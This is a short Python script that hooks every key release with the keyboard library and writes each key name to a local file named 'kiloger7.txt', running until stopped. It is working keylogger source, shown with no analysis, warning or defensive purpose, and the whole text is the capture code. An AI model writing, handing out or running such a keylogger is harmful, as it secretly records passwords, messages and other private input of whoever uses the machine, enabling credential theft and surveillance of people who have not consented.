import keyboard
openfile = open("kiloger7.txt" ,"w")
def new_key(event):
    print("new event")
    button = event.name
    if button == "space":
        openfile.write(" ")
    else:
        openfile.write(button)
        openfile.flush()

keyboard.on_release(callback=new_key)   
keyboard.wait()